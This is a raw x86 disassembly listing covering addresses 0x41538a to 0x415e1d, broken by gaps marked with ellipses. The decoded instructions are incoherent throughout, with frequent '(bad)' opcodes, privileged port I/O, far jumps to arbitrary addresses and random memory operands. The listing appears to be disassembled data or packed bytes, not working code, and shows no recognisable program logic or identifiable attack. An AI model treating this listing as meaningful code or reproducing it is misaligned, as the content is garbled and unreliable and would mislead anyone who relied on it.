  41538a:	loopne 0x41531a
  41538c:	inc    edx
  41538d:	les    ecx,FWORD PTR [edi+0x1101eaa4]
  415393:	dec    ecx
  415394:	or     cl,BYTE PTR [ecx-0x1da9cc7c]
  41539a:	xor    al,0xee
  41539c:	mov    ebx,DWORD PTR [edx-0x29f3846f]
  4153a2:	mov    ?,WORD PTR [ebp+0x4ce72b9a]
  4153a8:	cmp    dh,BYTE PTR [eax+0x5f]
  4153ab:	push   ecx
  4153ac:	fidiv  DWORD PTR ds:[ebx+ecx*2+0x4486c4db]
  4153b4:	loop   0x4153ba
  4153b6:	loopne 0x41537d
  4153b8:	dec    ebx
  4153b9:	mov    edx,0x7c63c4e0
  4153be:	in     al,0xfc
  4153c0:	jg     0x415399
  4153c2:	push   edi
  4153c3:	jle    0x4153ea
  4153c5:	test   al,0xf3
  4153c7:	scas   al,BYTE PTR es:[edi]
  4153c8:	pop    edx
  4153c9:	adc    al,0xf4
  4153cb:	jns    0x415411
  4153cd:	fcom   DWORD PTR [esi+ebp*2-0x648975d2]
  4153d4:	rcl    DWORD PTR ds:0xacd33afe,0xda
  4153db:	xchg   esp,eax
  4153dc:	shl    BYTE PTR ds:0xcf359f62,1
  4153e2:	cld    
  4153e3:	out    0x55,eax
  4153e5:	repnz mov bh,dl
  4153e8:	dec    ebp
  4153e9:	push   esp
  4153ea:	and    BYTE PTR [eax+0x5d],0xca
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xefd3e5b0
  415463:	adc    eax,eax
  415465:	mul    BYTE PTR [edi-0x1b]
  415468:	add    BYTE PTR [eax],al
  41546a:	add    BYTE PTR [ecx],al
  41546c:	add    BYTE PTR [eax],al
  41546e:	xor    WORD PTR [eax+0x40ad1f97],di
  415475:	adc    al,0xc9
  415477:	cmp    ebx,DWORD PTR ds:0xf2897edd
  41547d:	scas   eax,DWORD PTR es:[edi]
  41547e:	outs   dx,DWORD PTR ds:[esi]
  41547f:	xlat   BYTE PTR ds:[ebx]
  415480:	and    al,0xe1
  415482:	and    eax,0x9e7025e8
  415487:	es push ds
  415489:	push   edx
  41548a:	aaa    
  41548b:	cmp    edi,DWORD PTR [edx+0x7ad41cbd]
  415491:	xchg   ecx,eax
  415492:	fild   QWORD PTR [esi]
  415494:	pushf  
  415495:	(bad)  
  415496:	loope  0x415477
  415498:	cmp    ebx,esp
  41549a:	repnz pushf 
  41549c:	cmp    DWORD PTR [ecx+0x25],edi
  41549f:	add    al,0x31
  4154a1:	test   esi,eax
  4154a3:	xchg   esi,eax
  4154a4:	lods   al,BYTE PTR ds:[esi]
  4154a5:	add    BYTE PTR [edx+0xa81886f],al
  4154ab:	sub    BYTE PTR [eax-0x6f6cb8a4],0x18
  4154b2:	fcomip st,st(6)
  4154b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154b5:	stos   DWORD PTR es:[edi],eax
  4154b6:	sbb    BYTE PTR [edx],bl
  4154b8:	ins    BYTE PTR es:[edi],dx
  4154b9:	mov    ah,0xed
  4154bb:	mov    ah,0xd2
  4154bd:	mov    eax,0x22a96dc3
  4154c2:	scas   al,BYTE PTR es:[edi]
  4154c3:	fadd   QWORD PTR [eax+0x7b9bcd32]
  4154c9:	iret   
  4154ca:	shr    DWORD PTR [ebp+0x5d],0xc2
  4154ce:	inc    esp
  4154cf:	test   eax,0x8ab5d8ee
  4154d4:	add    BYTE PTR [ecx+eax*2],cl
  4154d7:	push   DWORD PTR [ebx-0x4d]
  4154da:	shr    DWORD PTR [esi-0x1f],cl
  4154dd:	je     0x415495
  4154df:	mov    ecx,0xb7382d9e
  4154e4:	mov    cl,0x32
  4154e6:	adc    DWORD PTR [ebp+0x5e],eax
  4154e9:	sub    al,0x48
  4154eb:	xchg   ah,ah
  4154ed:	(bad)  
  4154ee:	int3   
  4154ef:	push   ds
  4154f0:	mov    al,dh
  4154f2:	push   ss
  4154f3:	and    al,0xce
  4154f5:	cdq    
  4154f6:	lds    ebp,FWORD PTR [edi-0x49e8da2a]
  4154fc:	cs push esi
  4154fe:	mov    ebx,0x82e222a9
  415503:	dec    edx
  415504:	mov    ds:0x668b0445,al
  415509:	test   al,0xdd
  41550b:	pop    esi
  41550c:	repnz es add al,0x8
  415510:	std    
  415511:	std    
  415512:	pop    ebp
  415513:	fwait
  415514:	into   
  415515:	sub    dh,BYTE PTR [edx-0x18815ee4]
  41551b:	ss cmp eax,0x71194eae
  415521:	iret   
  415522:	sahf   
  415523:	inc    esi
  415524:	and    ch,cl
  415526:	pop    esi
  415527:	mov    ecx,0x7cfa0c9
  41552c:	push   esi
  41552d:	adc    eax,0x343660ac
  415532:	mov    dh,0xc6
  415534:	mov    ch,0xda
  415536:	and    edi,edi
  415538:	mov    edx,DWORD PTR [ecx]
  41553a:	cmc    
  41553b:	test   eax,0x16ff9af5
  415540:	mov    ch,bl
  415542:	(bad)  
  415543:	mov    esp,0x499cea8
  415548:	mov    ah,0xc0
  41554a:	add    BYTE PTR [ebp-0x1a15184b],al
  415550:	xchg   edi,eax
  415551:	add    eax,0x16d6b7c2
  415556:	out    dx,eax
  415557:	das    
  415558:	test   eax,0xd0ae6543
  41555d:	test   eax,0xf49d2552
  415562:	push   ds
  415563:	les    ebp,FWORD PTR [edx+eax*8]
  415566:	(bad)  
  415567:	adc    BYTE PTR [ebx-0x3fae4ab9],dh
  41556d:	dec    ecx
	...
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155dc
  4155e3:	sub    ebp,ebp
  4155e5:	(bad)  
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    ch,dh
  4155ef:	xchg   ecx,eax
  4155f0:	push   ds
  4155f1:	cmp    BYTE PTR [ebx-0x70268499],bh
  4155f7:	inc    edx
  4155f8:	push   esi
  4155f9:	fld    QWORD PTR [ebp+0x48deb130]
  4155ff:	mov    dh,0xcb
  415601:	mov    eax,0x896bbea0
  415606:	nop
  415607:	mov    al,ds:0x33d11aa
  41560c:	adc    bl,BYTE PTR [eax]
  41560e:	jecxz  0x415673
  415610:	stos   BYTE PTR es:[edi],al
  415611:	cld    
  415612:	mov    eax,0xaea44bed
  415617:	and    DWORD PTR ds:0x7a9e84e1,eax
  41561d:	lock shl eax,cl
  415620:	jb     0x415693
  415622:	(bad)  
  415623:	cld    
  415624:	sub    BYTE PTR [edi+eax*4],ch
  415627:	dec    ebx
  415628:	push   esi
  415629:	jecxz  0x4155e7
  41562b:	lods   eax,DWORD PTR ds:[esi]
  41562c:	out    dx,al
  41562d:	dec    ebp
  41562e:	icebp  
  41562f:	ret    0x3bb7
  415632:	out    0x6e,eax
  415634:	mov    edi,0xd457008f
  415639:	cs loop 0x415657
  41563c:	or     BYTE PTR [eax+0x43d5a7dd],ch
  415642:	mov    eax,ds:0x1f1cbd71
  415647:	aad    0xe3
  415649:	push   edi
  41564a:	add    ecx,DWORD PTR [edx+0x41]
  41564d:	xor    al,0x2d
  41564f:	icebp  
  415650:	pop    es
  415651:	js     0x415604
  415653:	xchg   ebp,eax
  415654:	rcr    BYTE PTR [ebx],cl
  415656:	add    cl,BYTE PTR [edi]
  415658:	out    dx,eax
  415659:	lods   al,BYTE PTR ds:[esi]
  41565a:	inc    esi
  41565b:	ds in  eax,0x71
  41565e:	mov    edx,0xe8f3169f
  415663:	std    
  415664:	pop    esp
  415665:	sub    edx,DWORD PTR [esi+ecx*8-0x48]
  415669:	inc    esp
  41566a:	push   edx
  41566b:	jp     0x41566d
  41566d:	push   ebp
  41566e:	push   cs
  41566f:	enter  0x5531,0x6f
  415673:	cmp    al,BYTE PTR [edi-0x22]
  415676:	inc    esp
  415677:	dec    bl
  415679:	mov    esp,0x591f1328
  41567e:	nop
  41567f:	and    eax,0x821e4d2a
  415684:	neg    DWORD PTR [ecx+ebx*4-0x66]
  415688:	call   DWORD PTR [ecx+0x3c]
  41568b:	push   cs
  41568c:	add    eax,0xaeb73ee8
  415691:	pop    ebx
  415692:	xchg   edx,eax
  415693:	adc    edi,ecx
  415695:	mov    ebx,0x1e259206
  41569a:	icebp  
  41569b:	jmp    0x415620
  41569d:	xchg   ecx,eax
  41569e:	xor    dl,BYTE PTR [eax]
  4156a0:	imul   esp,DWORD PTR [esi-0x65fe8099],0x4852fa54
  4156aa:	xlat   BYTE PTR ds:[ebx]
  4156ab:	cmc    
  4156ac:	ins    BYTE PTR es:[edi],dx
  4156ad:	xchg   edi,eax
  4156ae:	das    
  4156af:	nop
  4156b0:	aaa    
  4156b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b2:	add    al,0xa6
  4156b4:	push   esp
  4156b5:	mov    dl,0x72
  4156b7:	jle    0x415676
  4156b9:	and    DWORD PTR ds:0x98e662d1,0xf42f6275
  4156c3:	mov    DWORD PTR [edx],eax
  4156c5:	adc    eax,0x7153b5ef
  4156cb:	pop    ss
  4156cc:	sub    eax,0x501199be
  4156d1:	push   ecx
  4156d2:	aad    0x65
  4156d4:	xchg   DWORD PTR [esi-0x2060417],ebx
  4156da:	ss call 0xdaf02ea8
  4156e0:	cli    
  4156e1:	loop   0x4156ec
  4156e3:	mov    ?,WORD PTR [ecx]
  4156e5:	aas    
  4156e6:	ds es leave 
  4156e9:	or     al,0xbb
  4156eb:	dec    ebp
  4156ec:	retf   
  4156ed:	pop    es
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x64
  415763:	adc    BYTE PTR [ebx+0xe76791],al
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [eax-0xbccd945],dh
  415773:	mov    DWORD PTR [ebx-0x32],ebx
  415776:	aaa    
  415777:	inc    eax
  415778:	pop    edi
  415779:	pop    ecx
  41577a:	lods   al,BYTE PTR ds:[esi]
  41577b:	test   DWORD PTR [ecx-0x5b047838],esi
  415781:	xchg   esp,eax
  415782:	jb     0x4157bb
  415784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415785:	jb     0x41575d
  415787:	imul   edi,ebp,0xe254a7fe
  41578d:	out    0xb,al
  41578f:	mov    edx,0xa74b89f6
  415794:	dec    esp
  415795:	(bad)  
  415796:	out    dx,al
  415797:	add    dh,BYTE PTR [edi+0x70]
  41579a:	(bad)  
  41579b:	add    ch,bh
  41579d:	and    al,0x8b
  41579f:	xor    dl,BYTE PTR [ecx-0x11977412]
  4157a5:	fstp   TBYTE PTR [edi-0x172e1de9]
  4157ab:	or     ch,BYTE PTR [eax+edi*4+0x7a]
  4157af:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4157b1:	stos   DWORD PTR es:[edi],eax
  4157b2:	fcmovnbe st,st(7)
  4157b4:	xchg   ebx,eax
  4157b5:	push   0xffffffda
  4157b7:	loope  0x415811
  4157b9:	xchg   edx,eax
  4157ba:	mov    bh,0xd1
  4157bc:	inc    ebx
  4157bd:	pop    ss
  4157be:	xchg   esi,eax
  4157bf:	pusha  
  4157c0:	mov    ah,0xba
  4157c2:	sbb    dh,BYTE PTR [edi]
  4157c4:	rcr    eax,0x6f
  4157c7:	sti    
  4157c8:	mov    BYTE PTR [edx+0x6df8b343],cl
  4157ce:	mov    dl,0xff
  4157d0:	dec    ebx
  4157d1:	mov    dh,0x3d
  4157d3:	inc    ebp
  4157d4:	scas   eax,DWORD PTR es:[edi]
  4157d5:	xchg   eax,eax
  4157d7:	lods   al,BYTE PTR ds:[esi]
  4157d8:	cmc    
  4157d9:	cmp    al,0xdd
  4157db:	bound  esi,QWORD PTR [ebx+0x291508e3]
  4157e1:	test   eax,0x7a3bba6c
  4157e6:	fist   WORD PTR [ecx]
  4157e8:	ds jno 0x415855
  4157eb:	in     eax,dx
  4157ec:	nop
  4157ed:	stos   BYTE PTR es:[edi],al
  4157ee:	into   
  4157ef:	and    edi,DWORD PTR [edi-0x9c7b791]
  4157f5:	cmp    al,0xbd
  4157f7:	mov    fs:0xf60bc127,eax
  4157fd:	mov    dh,0xc6
  4157ff:	jno    0x4157e5
  415801:	xor    al,0x8c
  415803:	daa    
  415804:	into   
  415805:	fisttp DWORD PTR [ebx-0x28]
  415808:	and    eax,0xb2088c0f
  41580d:	cmc    
  41580e:	cmp    esi,ecx
  415810:	cmc    
  415811:	or     eax,0xd6b7b36e
  415816:	popa   
  415817:	jnp    0x4157fb
  415819:	rcl    DWORD PTR [ecx+0x5df54b84],cl
  41581f:	ins    BYTE PTR es:[edi],dx
  415820:	fs retf 
  415822:	add    eax,0x447931ed
  415827:	push   cs
  415828:	mov    al,ds:0x36a213e0
  41582d:	(bad)  
  41582e:	cmp    BYTE PTR [edi],ah
  415830:	xchg   esi,eax
  415831:	mov    eax,0xe21328ef
  415836:	sbb    eax,0xdf6f8989
  41583b:	mov    esi,0xfab96353
  415840:	imul   ecx,DWORD PTR [eax],0x39
  415843:	add    eax,0x9586e0cd
  415848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415849:	inc    edi
  41584a:	test   al,0x15
  41584c:	hlt    
  41584d:	xchg   DWORD PTR [edx+0x33],esi
  415850:	imul   esp,DWORD PTR [ebp+0x33],0xffffffd5
  415854:	lds    ecx,FWORD PTR [eax+0x8de0250]
  41585a:	in     al,0xf8
  41585c:	retf   0x26b9
  41585f:	sar    cl,1
  415861:	adc    BYTE PTR [esi+ebx*8],0x8d
  415865:	push   edx
  415866:	mov    BYTE PTR [edi-0x40bcd16e],dh
  41586c:	cmc    
  41586d:	xchg   BYTE PTR [eax],al
	...
  4158d3:	add    BYTE PTR [eax],al
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcl    DWORD PTR [edx+0x70],cl
  4158e4:	in     eax,dx
  4158e5:	inc    ecx
  4158e6:	addr16 call 0x14158ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	les    edi,FWORD PTR [edx]
  4158f0:	cli    
  4158f1:	push   es
  4158f2:	scas   al,BYTE PTR es:[edi]
  4158f3:	call   0x89be:0xbb0fff8b
  4158fa:	mov    al,0xdd
  4158fc:	mov    ch,0x73
  4158fe:	push   ecx
  4158ff:	sar    DWORD PTR [edi-0x6bea7003],1
  415905:	test   BYTE PTR [edx+0xa9f6771],dl
  41590b:	jg     0x415904
  41590d:	pop    eax
  41590e:	mov    ebx,0xf807d0b3
  415913:	add    DWORD PTR [ebx+0x31a81694],ecx
  415919:	and    dl,BYTE PTR [ecx+0x79]
  41591c:	das    
  41591d:	(bad)  
  41591e:	and    BYTE PTR [ebx+0x887a98c],dl
  415924:	cmp    eax,0x860d579d
  415929:	pop    ebx
  41592a:	push   0x5c
  41592c:	xchg   edx,eax
  41592d:	add    BYTE PTR [ecx+0x2bffe3f7],al
  415933:	fs std 
  415935:	xchg   ecx,eax
  415936:	fsubr  DWORD PTR [ebp-0xf4c774d]
  41593c:	aas    
  41593d:	pop    ss
  41593e:	ret    
  41593f:	fisttp QWORD PTR [esp+ebp*4]
  415943:	stos   DWORD PTR es:[edi],eax
  415944:	daa    
  415945:	xchg   ebx,eax
  415946:	ret    
  415947:	sbb    edi,DWORD PTR [ebx+0x57]
  41594a:	popaw  
  41594c:	jge    0x41597a
  41594e:	dec    eax
  41594f:	aad    0xa9
  415951:	ja     0x41593d
  415953:	dec    ebp
  415954:	int    0x6b
  415956:	mov    esp,0x823708ee
  41595b:	push   cs
  41595c:	or     DWORD PTR [esi-0xacb59f5],0xf8fe1514
  415966:	and    DWORD PTR [esi+edi*2],0xffffffb3
  41596a:	inc    DWORD PTR [esi]
  41596c:	in     eax,0xc8
  41596e:	cmp    BYTE PTR [ebx],0xc2
  415971:	jmp    0x820982c0
  415976:	div    DWORD PTR ds:0xfb6b49e8
  41597c:	int    0x3f
  41597e:	sar    BYTE PTR [edi],cl
  415980:	imul   ebx,DWORD PTR [edx],0x5ec003f6
  415986:	xor    al,0x42
  415988:	pusha  
  415989:	fucomip st,st(1)
  41598b:	icebp  
  41598c:	xchg   esi,eax
  41598d:	mov    ecx,0xd9f3c623
  415992:	in     eax,0xc9
  415994:	inc    edi
  415995:	fwait
  415996:	(bad)  
  415998:	jmp    0x2a1:0x76db786
  41599f:	out    dx,eax
  4159a0:	jo     0x415a11
  4159a2:	int    0xb1
  4159a4:	adc    edi,DWORD PTR [ebx-0x332b3621]
  4159aa:	fisub  DWORD PTR [eax]
  4159ac:	and    eax,0x5ae9fbae
  4159b1:	push   0x3519bb67
  4159b6:	mov    eax,ds:0xa6373c88
  4159bb:	jl     0x415997
  4159bd:	or     ebp,ecx
  4159bf:	in     eax,0xe8
  4159c1:	aaa    
  4159c2:	(bad)  
  4159c4:	sar    ah,0x87
  4159c7:	clc    
  4159c8:	fdivr  DWORD PTR [edi-0x20]
  4159cb:	jmp    0x8b615c90
  4159d0:	inc    eax
  4159d1:	jle    0x415a44
  4159d3:	fcmovu st,st(0)
  4159d5:	mov    bl,0x42
  4159d7:	adc    eax,0x3fed753b
  4159dc:	xchg   edi,eax
  4159dd:	mov    eax,ds:0xa1e8b6c8
  4159e2:	stos   DWORD PTR es:[edi],eax
  4159e3:	or     eax,0x8687ba6d
  4159e8:	fld    DWORD PTR [ebx-0x6b]
  4159eb:	sbb    ah,BYTE PTR [edi+0x11]
	...
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	ins    BYTE PTR es:[edi],dx
  415a63:	and    al,0x75
  415a65:	daa    
  415a66:	addr16 jmp 0x1415a6c
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	ret    
  415a6f:	sbb    DWORD PTR [eax-0x7d],edi
  415a72:	popa   
  415a73:	push   ebp
  415a74:	scas   eax,DWORD PTR es:[edi]
  415a75:	test   DWORD PTR [ebp-0x55d4b7e],0x82490fc
  415a7f:	xchg   esp,eax
  415a80:	out    dx,eax
  415a81:	neg    BYTE PTR [ecx+0x376a7068]
  415a87:	jp     0x415ae7
  415a89:	mov    BYTE PTR [ecx],dl
  415a8b:	in     eax,0x9a
  415a8d:	xchg   edi,eax
  415a8e:	or     al,dl
  415a90:	(bad)  
  415a91:	pushf  
  415a92:	jbe    0x415aed
  415a94:	iret   
  415a95:	out    dx,al
  415a96:	ins    BYTE PTR es:[edi],dx
  415a97:	fsubr  DWORD PTR [eax-0x6f]
  415a9a:	ja     0x415ada
  415a9c:	clc    
  415a9d:	call   0xd21b251f
  415aa2:	dec    eax
  415aa3:	adc    esp,0xffffffba
  415aa6:	fcom   DWORD PTR [edi+0x4e]
  415aa9:	push   esi
  415aaa:	shr    BYTE PTR [esi-0x56],1
  415aad:	jo     0x415a79
  415aaf:	test   eax,0x7227196a
  415ab4:	fdiv   QWORD PTR [ebp-0x54]
  415ab7:	jbe    0x415a3e
  415ab9:	nop
  415aba:	xchg   esp,eax
  415abb:	sbb    DWORD PTR [ebx-0x2],ecx
  415abe:	sbb    BYTE PTR ds:0x892f93b6,dh
  415ac4:	and    DWORD PTR [edx-0x43554473],0x0
  415acb:	adc    BYTE PTR [eax-0x50],0xe
  415acf:	add    eax,0xa5394b9
  415ad4:	call   0x33c53496
  415ad9:	inc    edx
  415ada:	push   ds
  415adb:	or     bh,BYTE PTR [eax-0x20]
  415ade:	std    
  415adf:	fistp  QWORD PTR [edi+0x7d]
  415ae2:	and    ah,BYTE PTR [ecx-0x1653680]
  415ae8:	inc    BYTE PTR [edi+esi*8]
  415aeb:	(bad)  
  415aec:	mov    es,WORD PTR [ebp-0x9dce5b]
  415af2:	xchg   bh,ah
  415af4:	aaa    
  415af5:	repnz xchg esp,eax
  415af7:	jnp    0x415b40
  415af9:	imul   esi,DWORD PTR [ebx-0x7e],0x75
  415afd:	jae    0x415aae
  415aff:	and    BYTE PTR [ecx-0x1c],ah
  415b02:	xchg   edx,eax
  415b03:	jbe    0x415b56
  415b05:	pop    es
  415b06:	rcr    DWORD PTR [esi+0x9fefcab],0x4b
  415b0d:	mov    esp,ds
  415b0f:	bound  ecx,QWORD PTR [ecx-0x2f62d40b]
  415b15:	aaa    
  415b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b17:	frstor [edx+0x69]
  415b1a:	xchg   esp,eax
  415b1b:	aam    0x49
  415b1d:	mov    edi,0x59148225
  415b22:	call   0xc616:0xe5f69942
  415b29:	hlt    
  415b2a:	mov    bl,0x1e
  415b2c:	dec    esi
  415b2d:	jg     0x415b2c
  415b2f:	and    dh,BYTE PTR [eax-0x33]
  415b32:	sbb    bh,BYTE PTR [esi-0x76e31e66]
  415b38:	push   ds
  415b39:	jnp    0x415b46
  415b3b:	and    ch,dh
  415b3d:	jmp    0x5924d008
  415b42:	or     DWORD PTR [edx-0x47],ecx
  415b45:	scas   eax,DWORD PTR es:[edi]
  415b46:	jb     0x415b45
  415b48:	(bad)  
  415b49:	dec    ebx
  415b4a:	std    
  415b4b:	fadd   DWORD PTR [edi-0x51f48e02]
  415b51:	push   edx
  415b52:	dec    edx
  415b53:	xlat   BYTE PTR ds:[ebx]
  415b54:	add    DWORD PTR [edi+ebx*4],ecx
  415b57:	je     0x415b4c
  415b59:	dec    esp
  415b5a:	leave  
  415b5b:	jge    0x415af2
  415b5d:	cmp    eax,0xf57a618
  415b62:	lods   al,BYTE PTR ds:[esi]
  415b63:	dec    ebx
  415b64:	lods   eax,DWORD PTR ds:[esi]
  415b65:	outs   dx,DWORD PTR ds:[esi]
  415b66:	sub    edi,DWORD PTR [edi+ebp*8]
  415b69:	or     DWORD PTR [eax-0x34],edi
  415b6c:	ficom  WORD PTR [eax+eax*1]
	...
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdivr  QWORD PTR [eax]
  415be3:	loop   0x415bce
  415be5:	sub    DWORD PTR [edi-0x16],esp
  415be8:	add    BYTE PTR [eax],al
  415bea:	add    BYTE PTR [ecx],al
  415bec:	add    BYTE PTR [eax],al
  415bee:	push   ebp
  415bef:	add    eax,0x7d2e12d1
  415bf4:	jnp    0x415c26
  415bf6:	mov    ds:0x9d31e645,eax
  415bfb:	jmp    0x59bad3d0
  415c00:	nop
  415c01:	lods   eax,DWORD PTR ds:[esi]
  415c02:	jb     0x415bd0
  415c04:	(bad)  
  415c05:	in     al,dx
  415c06:	shr    BYTE PTR ds:0xdaa35752,cl
  415c0c:	aad    0x86
  415c0e:	lods   eax,DWORD PTR ds:[esi]
  415c0f:	cmp    BYTE PTR [edx-0x53a5d3f7],dl
  415c15:	int    0x15
  415c17:	push   ds
  415c18:	pop    edx
  415c19:	fmulp  st(4),st
  415c1b:	outs   dx,DWORD PTR ds:[esi]
  415c1c:	cmp    BYTE PTR [ebx-0x6a6d0ec8],dh
  415c22:	nop
  415c23:	scas   eax,DWORD PTR es:[edi]
  415c24:	sbb    bl,BYTE PTR [eax-0x3995c67c]
  415c2a:	push   edx
  415c2b:	sbb    eax,0x10
  415c2e:	cmc    
  415c2f:	mov    ecx,es
  415c31:	push   ds
  415c32:	out    dx,eax
  415c33:	mov    eax,0x53bfdcf5
  415c38:	out    0xef,eax
  415c3a:	push   ebx
  415c3b:	push   esi
  415c3c:	sbb    BYTE PTR [eax],al
  415c3e:	dec    esp
  415c3f:	adc    WORD PTR [esi-0x7a5cfd89],di
  415c46:	push   edi
  415c47:	adc    DWORD PTR [edi-0x25fe9114],0x24172ed3
  415c51:	outs   dx,BYTE PTR ds:[esi]
  415c52:	jnp    0x415c1b
  415c54:	inc    esp
  415c55:	mov    dl,BYTE PTR [ebx+0xd]
  415c58:	leave  
  415c59:	mov    ch,0x5e
  415c5b:	or     dh,al
  415c5d:	cdq    
  415c5e:	ins    DWORD PTR es:[edi],dx
  415c5f:	clc    
  415c60:	xor    eax,DWORD PTR [ebx+0x2dc01921]
  415c66:	sub    eax,eax
  415c68:	pop    esp
  415c69:	imul   esi,DWORD PTR ds:0x6be23276,0x3aee530f
  415c73:	inc    ecx
  415c74:	sub    esi,edi
  415c76:	sub    eax,0x7744d103
  415c7b:	add    dh,al
  415c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c7e:	das    
  415c7f:	aaa    
  415c80:	xchg   ecx,eax
  415c81:	sahf   
  415c82:	lds    edx,FWORD PTR [esi+0x4a]
  415c85:	or     ah,BYTE PTR [edi]
  415c87:	mov    ch,0x9b
  415c89:	adc    esi,DWORD PTR [eax-0x259ef239]
  415c8f:	mov    esi,0x69499b8d
  415c94:	xor    cl,dh
  415c96:	shl    DWORD PTR fs:[esi+0x20],0x23
  415c9b:	push   cs
  415c9c:	push   edx
  415c9d:	sub    ch,BYTE PTR [edi]
  415c9f:	dec    edx
  415ca0:	push   es
  415ca1:	comiss xmm5,DWORD PTR [ebx-0x48b9634]
  415ca8:	fidivr DWORD PTR [ecx]
  415caa:	pcmpgtd mm2,QWORD PTR [ecx]
  415cad:	mov    bh,0x30
  415caf:	sti    
  415cb0:	aad    0x4c
  415cb2:	imul   eax,DWORD PTR [eax*8+0x5246512e],0xffffffb6
  415cba:	xor    bh,BYTE PTR [ecx]
  415cbc:	dec    ebx
  415cbd:	out    dx,eax
  415cbe:	mov    dh,0x5b
  415cc0:	sar    dl,1
  415cc2:	jnp    0x415cd5
  415cc4:	(bad)  
  415cc5:	test   esp,0xbda4e69b
  415ccb:	jb     0x415d0a
  415ccd:	mov    cl,0xb5
  415ccf:	push   esi
  415cd0:	xchg   esp,eax
  415cd1:	lahf   
  415cd2:	pop    ecx
  415cd3:	push   esp
  415cd4:	ds loop 0x415d2d
  415cd7:	test   eax,0xfe277713
  415cdc:	mov    edx,0xea723d41
  415ce1:	call   0xce85:0x2a808b19
  415ce8:	rcr    ecx,cl
  415cea:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cec:	cli    
  415ced:	pop    ebp
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x12f1261f
  415d65:	jne    0x415dce
  415d67:	jmp    0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [edx+0x4e],bl
  415d70:	inc    ebp
  415d71:	test   eax,0x70bd63d2
  415d76:	out    0xd4,al
  415d78:	sbb    dl,ah
  415d7a:	push   ecx
  415d7b:	sub    al,0x69
  415d7d:	gs mov al,0x68
  415d80:	push   ebp
  415d81:	adc    DWORD PTR [eax-0x23],esi
  415d84:	sub    al,0x81
  415d86:	sub    ecx,DWORD PTR [edx]
  415d88:	xchg   edx,eax
  415d89:	scas   al,BYTE PTR es:[edi]
  415d8a:	mov    esi,0x65446b16
  415d8f:	or     esp,DWORD PTR [eax]
  415d91:	mov    ds:0xd51a1691,eax
  415d96:	int3   
  415d97:	icebp  
  415d98:	xchg   ebp,eax
  415d99:	mov    eax,ds:0x3e0e079c
  415d9e:	push   es
  415d9f:	mov    ds:0x9cf4828f,eax
  415da4:	aas    
  415da5:	in     eax,dx
  415da6:	inc    esi
  415da7:	outs   dx,DWORD PTR ds:[esi]
  415da8:	add    BYTE PTR [eax-0x5b0cc790],0xfc
  415daf:	int3   
  415db0:	nop
  415db1:	ss add eax,esp
  415db4:	clc    
  415db5:	add    ch,BYTE PTR [eax+0x76d07f70]
  415dbb:	js     0x415e05
  415dbd:	in     al,dx
  415dbe:	push   0x9789442f
  415dc3:	lods   al,BYTE PTR ds:[esi]
  415dc4:	xchg   DWORD PTR [edi+0x22],esi
  415dc7:	dec    ebx
  415dc8:	mov    ah,BYTE PTR [ebx-0x4b]
  415dcb:	lock inc esp
  415dcd:	lahf   
  415dce:	inc    esi
  415dcf:	sub    bl,BYTE PTR [esi-0xe]
  415dd2:	out    0x1c,eax
  415dd4:	jl     0x415d77
  415dd6:	popa   
  415dd7:	mov    edx,0x244068ae
  415ddc:	(bad)  
  415ddd:	out    0xb,eax
  415ddf:	sub    al,0x5a
  415de1:	(bad)  
  415de2:	sub    bl,dh
  415de4:	mov    esi,0x36a5809c
  415de9:	cmp    eax,0x7d14ecef
  415dee:	push   ds
  415def:	into   
  415df0:	in     al,0xd2
  415df2:	jl     0x415d94
  415df4:	push   cs
  415df5:	jmp    0xfa5148da
  415dfa:	bound  ebx,QWORD PTR [ebx]
  415dfc:	sahf   
  415dfd:	mov    DWORD PTR [ebx+0x7a3b25d5],ebx
  415e03:	sbb    ebx,DWORD PTR [ebx]
  415e05:	mov    edi,DWORD PTR [ecx-0x5f]
  415e08:	mov    eax,ds:0x917905ab
  415e0d:	fdiv   DWORD PTR [esi]
  415e0f:	test   al,0x34
  415e11:	inc    edi
  415e12:	(bad)  
  415e13:	jne    0x415e38
  415e15:	imul   edx,DWORD PTR [eax],0xffffffae
  415e18:	sbb    eax,0xd71bfd8e
  415e1d:	outs   dx,DWORD PTR ds:[esi]
